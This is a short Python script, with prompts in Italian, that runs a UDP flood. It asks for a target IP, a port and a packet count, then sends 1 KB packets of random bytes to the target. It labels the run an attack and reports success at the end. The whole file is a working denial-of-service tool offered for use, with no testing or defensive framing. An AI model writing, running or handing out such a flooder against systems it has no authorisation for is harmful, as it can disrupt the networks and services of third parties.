import socket
import random
import time
import sys

def udp_flood(target_ip, target_port, num_packets):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_size = 1024  # 1 KB

    print(f"\n\033[93m[!] Inizio UDP Flood su {target_ip}:{target_port} - {num_packets} pacchetti da 1KB\033[0m\n")

    try:
        for i in range(1, num_packets + 1):
            data = random._urandom(packet_size)
            sock.sendto(data, (target_ip, target_port))
            print(f"\033[92m[✓] Pacchetto {i}/{num_packets} inviato\033[0m", end="\r")
            time.sleep(0.01)  # breve delay per evitare sovraccarico locale
    except KeyboardInterrupt:
        print("\n\033[91m[!] Attacco interrotto manualmente\033[0m")
        sys.exit()
    except Exception as e:
        print(f"\n\033[91m[!] Errore: {e}\033[0m")
        sys.exit()

    print(f"\n\033[94m[✓] Attacco completato con successo!\033[0m")

def get_user_input():
    try:
        ip = input("Inserisci l'IP della macchina target: ").strip()
        port = int(input("Inserisci la porta UDP target (es. 5555): ").strip())
        if not (1 <= port <= 65535):
            raise ValueError("La porta deve essere compresa tra 1 e 65535.")
        packets = int(input("Quanti pacchetti da 1KB vuoi inviare? ").strip())
        if packets <= 0:
            raise ValueError("Il numero di pacchetti deve essere maggiore di zero.")
        return ip, port, packets
    except ValueError as ve:
        print(f"\033[91m[!] Errore di input: {ve}\033[0m")
        sys.exit()

def main():
    ip, port, packets = get_user_input()
    udp_flood(ip, port, packets)

if __name__ == "__main__":
    main()
